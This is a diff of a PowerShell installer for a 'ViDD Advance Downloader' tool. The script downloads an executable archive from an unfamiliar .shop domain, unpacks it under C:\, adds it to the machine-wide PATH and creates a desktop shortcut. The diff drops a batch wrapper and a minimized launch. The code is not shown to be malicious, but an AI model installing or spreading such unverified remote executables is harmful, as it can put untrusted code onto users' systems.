@@ -18,9 +18,7 @@ $downloadURL = "https://www.api-qsr.shop/vidd_exe.zip"
 $archiveFile = "$env:TEMP\vidd_exe.zip"
 $extractFolder = "C:\vidd_exe"
 $exeName = "run.exe"
-$batName = "run_me.bat"
 $shortcutName = "ViDD Advance Downloader.lnk"
-$iconFile = "$extractFolder\Icons\main.icon"  # Adjusted path for icon
 
 Write-Host "Downloading file..."
 Invoke-WebRequest -Uri $downloadURL -OutFile $archiveFile -UseBasicParsing
@@ -82,24 +80,15 @@ if ($existingPath -notlike "*$finalFolder*") {
     [Environment]::SetEnvironmentVariable("Path", "$existingPath;$finalFolder", "Machine")
 }
 
-# Create run_me.bat file
-Write-Host "Creating run_me.bat file..."
-$batContent = "@echo off`nstart `"$finalFolder\$exeName`""
-Set-Content -Path "$finalFolder\$batName" -Value $batContent -Encoding ASCII
-
-# Create desktop shortcut with custom icon
+# Create desktop shortcut directly to run.exe
 Write-Host "Creating desktop shortcut..."
 $WshShell = New-Object -ComObject WScript.Shell
 $desktopPath = [Environment]::GetFolderPath("Desktop")
 $shortcut = $WshShell.CreateShortcut("$desktopPath\$shortcutName")
-$shortcut.TargetPath = "$finalFolder\$batName"
+$shortcut.TargetPath = "$finalFolder\$exeName"
 $shortcut.WorkingDirectory = $finalFolder
-if (Test-Path $iconFile) {
-    $shortcut.IconLocation = $iconFile
-} else {
-    Write-Host "Icon file not found. Using default icon."
-}
-$shortcut.WindowStyle = 7  # Start minimized
+$shortcut.IconLocation = "$finalFolder\$exeName"  # Keep original EXE icon
+$shortcut.WindowStyle = 1  # Normal window
 $shortcut.Save()
 
 Write-Host "Done!"
